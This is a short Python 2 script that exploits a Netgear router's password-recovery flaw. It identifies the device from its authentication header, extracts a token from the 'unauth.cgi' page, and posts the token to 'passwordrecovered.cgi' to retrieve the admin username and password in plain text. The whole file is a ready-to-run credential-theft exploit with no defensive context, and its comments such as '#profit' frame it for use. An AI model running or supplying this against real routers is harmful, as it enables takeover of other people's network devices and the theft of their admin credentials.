import sys
import requests


def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
    	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
    	return "i_dont_speak_english"
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage - get token
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
    r = requests.get(url, headers={'Connection':'close'})
except:
    url = 'https://' + ip + ':' + port + '/'
    r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
    print "Attcking: " + model[13:-1]
else:
    print "not a netgear router"
    sys.exit(0)
token = scrape(r.text, 'unauth.cgi?id=', '\"')
if token == 'i_dont_speak_english':
    print "not vulnerable"
    sys.exit(0)
print "token found: " + token
#2nd stage - pass the token - get the password
url = url + 'passwordrecovered.cgi?id=' + token
r = requests.post(url, verify=False)
#profit
if r.text.find('left\">') != -1:
    username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
    username = scrape(username, '>', '\'')
    password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
    password = scrape(password, '>', '\'')
    if username == "i_dont_speak_english":
        username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
        password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
else:
    print "not vulnerable becuse password recovery IS set"
    sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace("&#35;","#")
password = password.replace("&","&")
print "user: " + username
print "pass: " + password